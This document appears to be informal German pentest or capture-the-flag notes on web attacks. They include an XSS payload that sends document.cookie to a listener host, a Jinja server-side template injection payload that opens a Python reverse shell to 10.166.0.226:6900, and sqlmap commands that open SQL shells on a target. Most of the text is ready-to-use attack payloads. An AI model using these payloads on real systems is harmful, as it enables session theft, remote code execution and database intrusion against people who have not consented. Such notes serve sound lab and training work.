### XSS
HTML Button onclick - JavaScript Click Event
https://www.freecodecamp.org/news/html-button-onclick-javascript-click-event-tutorial/

Je nachdem was disabled ist, onclick, onerror oder so.

lokal nc öffnen zum listen dann aufm Server XSS mit Javascript
`<img src=x onerror=this.src='http://10.166.0.226:6900/?c='+document.cookie>`
### Template Injection
Templateting Engine rausfinden und Googeln

Für Jinja: https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.166.0.226\",6900));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'")}}{%endif%}{% endfor %}
```

### SQL Injection
Cheat Sheet: https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
Startseite: https://book.hacktricks.xyz/pentesting-web/sql-injection
#### SQL Map
SQL Map Wizard starten
`sqlmap -u http://10.166.162.137/ --wizard"`

SQL Shell
`sqlmap -u http://10.166.162.137/ --level 3 --risk 3 --forms --sql-shell`

Not sure für was das war
`sqlmap -u http://10.166.162.137/ --dbms=SQLite --sql-shell --data "name=bernd&comment=sss" --answers="follow=Y"`

Guide: https://www.stationx.net/sqlmap-cheat-sheet/

### PHP Injection
joa PHP Code halt oder so